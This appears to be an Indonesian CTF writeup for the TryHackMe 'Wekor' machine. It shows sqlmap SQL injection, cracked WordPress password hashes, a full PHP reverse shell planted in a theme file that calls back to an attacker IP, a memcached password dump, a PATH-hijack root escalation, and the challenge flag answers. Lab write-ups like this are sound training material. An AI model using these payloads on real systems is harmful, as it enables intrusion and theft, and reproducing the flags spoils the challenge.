Wekor - TryHackMe Writeup
Dokumentasi ini berisi langkah-langkah penyelesaian (writeup) untuk mesin Wekor di platform TryHackMe. Tantangan ini berfokus pada teknik enumerasi, eksploitasi web, dan eskalasi hak istimewa di lingkungan Linux.
📝 Ringkasan Mesin

    Nama Mesin: Wekor
    Tingkat Kesulitan: Medium
    Sistem Operasi: Linux
    Fokus Utama: SQL Injection (SQLi), WordPress, VHost Enumeration, Memcached, dan Reverse Engineering sederhana.

🚀 Langkah Penyelesaian
1. Enumerasi Awal
Langkah pertama adalah pemindaian port menggunakan Nmap untuk mengidentifikasi layanan yang berjalan:

```
$ sudo nmap -p- wekor.thm -vvv -sCV -T4
```
    Port 80 (HTTP): Layanan web utama.
    Port 22 (SSH): Akses jarak jauh.

Dianjurkan untuk menambahkan entri domain ke file hosts lokal agar mempermudah akses:
bash

```echo "<IP_ADDRESS> wekor.thm" | sudo tee -a /etc/hosts```

<img width="523" height="75" alt="image" src="https://github.com/user-attachments/assets/b8fe7c2a-4043-4c44-9f99-460db5be58d1" />

2. Eksploitasi Web & SQL Injection

    Directory Brute-forcing: Ditemukan direktori tersembunyi melalui file robots.txt yang mengarah ke /it-next.
    SQLi: Pada bagian keranjang belanja (it_cart.php), terdapat parameter yang rentan terhadap SQL Injection.
    SQLMap: Gunakan alat ini untuk mengekstrak data dari database, termasuk kredensial admin untuk WordPress.

```
┌──(kali㉿kali)-[~/TryHackMe]
└─$ sqlmap -u http://wekor.thm/it-next/it_cart.php --data "coupon_code=&apply_coupon=Apply%20Coupon" -D wordpress -T wp_users --dump
```
<img width="811" height="421" alt="image" src="https://github.com/user-attachments/assets/c970e128-95d1-4437-a4da-6939146234d0" />

```$ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt```

```
yeffrey - $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:rockyou
eagle - $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx
yura - $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13
```

```sudo echo "<IP_ADDRESS>    site.wekor.thm" > /etc/hosts```


3. Akses Awal (Initial Access)
   
   yura@wekor.thm:soccer13
   
<img width="339" height="290" alt="image" src="https://github.com/user-attachments/assets/d6a0b16d-87bf-428e-9c5b-a666a6998bed" />

    WordPress: Masuk ke dashboard admin menggunakan kredensial yang ditemukan.
    Reverse Shell: Ubah salah satu file tema PHP untuk menyisipkan payload reverse shell guna mendapatkan akses ke sistem sebagai user www-data.

<img width="282" height="56" alt="image" src="https://github.com/user-attachments/assets/02b00053-1a77-4ee9-9554-478ad6e1b8e1" />

```┌──(kali㉿kali)-[~/TryHackMe]```

```└─$ cat /usr/share/webshells/php/php-reverse-shell.php```

Hapus dan ganti 404 template '404.php'
$ip = '192.168.247.59';  // CHANGE THIS IP VPN
$port = 4444;       // CHANGE THIS port

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.49.145.199';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 




```

<img width="1366" height="684" alt="image" src="https://github.com/user-attachments/assets/522d5638-f3a7-4731-baa8-8b07ef5a86f2" />

4. Eskalasi Hak Istimewa (Privilege Escalation)

    User Escalation: Melakukan enumerasi pada layanan Memcached untuk menemukan kata sandi user lokal.
    Root Escalation:
        Menganalisis file binari ELF yang mencurigakan.
        Melakukan teknik binary spoofing atau memanfaatkan variabel PATH untuk mengeksekusi perintah dengan hak akses root.

```
telnet localhost 11211
stats items
...
END
stats cachedump 1 0
ITEM id [4 b; 1700509703 s]
ITEM email [14 b; 1700509703 s]
ITEM salary [8 b; 1700509703 s]
ITEM password [15 b; 1700509703 s]
ITEM username [4 b; 1700509703 s]
END
get user
...
get password
OrkAiSC00L24/7$
```
```
Orka@osboxes:~$ sudo -l
sudo -l
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

```
Orka@osboxes:~$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
Orka@osboxes:~$ whereis python
whereis python
python: /usr/bin/python3.5m /usr/bin/python2.7-config /usr/bin/python2.7 /usr/bin/python3.5 /usr/bin/python3.5m-config /usr/bin/python3.5-config /usr/bin/python /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python3.5 /etc/python /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python3.5m /usr/include/python2.7 /usr/include/python3.5 /usr/share/python /usr/share/man/man1/python.1.gz
Orka@osboxes:~$
```

```
#!/bin/bash
/bin/bash
```

```
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
   User Manual:   
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 0
0
root@osboxes:/usr/sbin#
```


🚩 Flag
Dapatkan kedua flag untuk menyelesaikan tantangan ini:

    User Flag: /home/user/local.txt
    Answer: 1a26a6d51c0172400add0e297608dec6
    Root Flag: /root/proof.txt
    Answer: f4e788f87cc3afaecbaf0f0fe9ae6ad7

    
